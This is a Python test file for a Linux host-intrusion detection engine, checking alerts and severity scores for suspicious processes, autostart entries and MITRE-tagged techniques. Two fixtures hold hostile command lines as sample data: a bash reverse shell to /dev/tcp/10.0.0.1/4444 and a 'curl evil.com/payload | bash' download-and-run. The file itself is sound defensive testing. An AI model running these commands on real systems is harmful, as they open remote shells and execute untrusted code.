from models import ProcessObs, PersistenceEntry
from engine import rules


def proc(**kw):
    base = dict(pid=100, name="firefox", exe="/usr/lib/firefox/firefox", ppid=50)
    base.update(kw)
    return ProcessObs(**base)


def test_tc01_baseline_no_alerts():                     # normal apps -> nothing flagged
    procs = [proc(), proc(pid=101, name="bash", exe="/usr/bin/bash")]
    assert rules.evaluate(procs, []) == []


def test_tc03_synthetic_event_has_rule_and_reason():    # injected suspicious event
    p = proc(name=".x", exe="/tmp/.x", input_devices=["/dev/input/event3"])
    alerts = rules.evaluate([p], [])
    assert alerts and alerts[0].severity == "High"
    text = " ".join(alerts[0].reasons)
    assert "OPENS_INPUT_DEVICE" in text and "EXEC_IN_TEMP" in text


def test_trusted_input_process_not_flagged():           # display server reads input legitimately
    p = proc(name="Xorg", exe="/usr/lib/xorg/Xorg", input_devices=["/dev/input/event0"])
    assert rules.evaluate([p], []) == []


def test_single_weak_signal_is_low():
    alerts = rules.evaluate([proc(temp_files=["/tmp/a.log"])], [])
    assert alerts[0].severity == "Low"


def test_tc02_new_startup_entry_recorded_and_scored():
    e = PersistenceEntry("autostart", "x.desktop", "/home/u/.config/autostart/x.desktop",
                         target="/tmp/evil", is_new=True)
    a = rules.evaluate([], [e])[0]
    assert a.severity == "Medium" and "NEW_STARTUP_ENTRY" in " ".join(a.reasons)


def test_correlation_persistence_plus_running_process_escalates():
    e = PersistenceEntry("autostart", "x.desktop", "/p/x.desktop", target="/tmp/evil", is_new=True)
    p = proc(name="evil", exe="/tmp/evil", ppid=1)
    sevs = {a.key: a.severity for a in rules.evaluate([p], [e])}
    assert sevs["proc:/tmp/evil"] == "High"


def test_tc04_inaccessible_metadata_does_not_crash():
    p = proc(exe="", fd_readable=False)
    assert rules.evaluate([p], []) == []


def test_siem_reverse_shell_detected():
    p = proc(name="bash", exe="/bin/bash", cmdline=["bash", "-i", ">&", "/dev/tcp/10.0.0.1/4444", "0>&1"])
    alerts = rules.evaluate([p], [])
    assert len(alerts) == 1
    assert alerts[0].severity == "Medium"
    text = " ".join(alerts[0].reasons)
    assert "REVERSE_SHELL_PATTERN" in text
    assert "[MITRE T1059.004]" in text


def test_siem_masquerading_detected():
    p = proc(name="launchd", exe="/tmp/launchd", cmdline=["/tmp/launchd"])
    alerts = rules.evaluate([p], [])
    assert len(alerts) == 1
    assert alerts[0].severity == "High"  # masquerading (3) + exec in temp (2) = 5
    text = " ".join(alerts[0].reasons)
    assert "PROCESS_MASQUERADING" in text
    assert "[MITRE T1036.005]" in text


def test_siem_deleted_executable_detected():
    p = proc(name="malware", exe="/usr/local/bin/dropped (deleted)", cmdline=["dropped"])
    alerts = rules.evaluate([p], [])
    assert len(alerts) == 1
    assert alerts[0].severity == "Low"  # 2 points
    text = " ".join(alerts[0].reasons)
    assert "DELETED_EXECUTABLE_RUNNING" in text
    assert "[MITRE T1070.004]" in text


def test_siem_obfuscated_command_detected():
    p = proc(name="sh", exe="/bin/sh", cmdline=["sh", "-c", "curl -s http://evil.com/payload | bash"])
    alerts = rules.evaluate([p], [])
    assert len(alerts) == 1
    assert alerts[0].severity == "Low"  # 2 points
    text = " ".join(alerts[0].reasons)
    assert "OBFUSCATED_COMMAND_EXECUTION" in text
    assert "[MITRE T1027]" in text

